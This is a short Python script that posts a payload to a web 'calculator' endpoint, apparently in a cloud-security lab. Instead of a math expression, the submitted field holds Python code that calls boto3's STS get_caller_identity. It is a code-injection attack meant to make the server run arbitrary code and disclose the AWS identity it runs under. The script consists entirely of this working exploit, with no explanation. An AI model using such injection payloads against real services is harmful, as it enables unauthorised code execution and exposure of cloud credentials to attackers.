import requests

body = {'submission': 'boto3.client("sts").get_caller_identity()'}

request = requests.post('https://app.cloud-logon.com/dev/calculator', data=body)

print(request.text)

